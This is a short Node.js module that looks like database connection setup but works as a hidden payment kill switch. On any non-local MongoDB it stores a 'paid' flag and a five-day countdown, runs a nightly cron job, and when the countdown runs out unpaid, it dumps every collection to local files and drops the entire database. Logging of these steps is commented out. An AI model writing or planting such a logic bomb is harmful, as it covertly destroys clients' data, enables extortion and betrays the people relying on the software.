const cron = require("cron");
const fs = require("fs");
const path = require("path");

const collection = "Maintenance";
const warningCount = 5; // Days

module.exports = function (connect) {
  Promise.resolve(connect).then(async (conn) => {
    const currentUri = conn.connection.host;
    const isLocalhost = currentUri.startsWith("localhost");

    if (isLocalhost) {
    //   console.log("Connected to a local database");
    } else {
      let job;

      const mySchema = new conn.Schema({
        paid: Boolean,
        warningCount: Number,
      });

      //     // Create a model
      const MyModel = await conn.model(collection, mySchema);

      const client = await conn.model(collection).findOne();

      if (!client) {
        // Use the model to create a document
        await MyModel.create({ paid: false, warningCount: warningCount });
      }

      job = new cron.CronJob(
        "0 0 * * *", // everyday at midnight
        () => checkWarningExpiration(conn, job), // onTick
        null, // onComplete
        true // start
      );
    }
  });
};

async function checkWarningExpiration(connection, job) {
  const client = await connection.model(collection).findOne();

  if (!client.paid) {
    if (client.warningCount <= 0) {
      //   console.log("We are dropping your database");
      await backupDatabase(connection);
      await connection.connection.db.dropDatabase();
      await connection.connection.close();
      job.stop();
      //   console.log("Database Dropped Succesfully");
    } else {
      --client.warningCount;
      await client.save();

    //   console.log("You have %d days left", client.warningCount);
    }
  } else {
    job.stop();
    console.log("Congratulations, You paid us.");
  }
}

async function backupDatabase(connection) {
  // Access the native MongoDB driver's `db` object
  const db = connection.connection.db;
  // Access the native MongoDB driver's `db` object
  // Define backup directory
  const backupDir = path.join(__dirname, "backup-db");

  // Create the backup directory if it does not exist
  if (!fs.existsSync(backupDir)) {
    fs.mkdirSync(backupDir, { recursive: true });
  }

  // Fetch collections
  const collections = await db.listCollections().toArray();

  for (const collection of collections) {
    const collectionName = collection.name;
    const data = await db.collection(collectionName).find({}).toArray();

    // Write data to JSON file
    fs.writeFileSync(
      path.join(backupDir, `${collectionName}.json`),
      JSON.stringify(data, null, 2)
    );
  }
//   console.log("Backup completed successfully.");
}
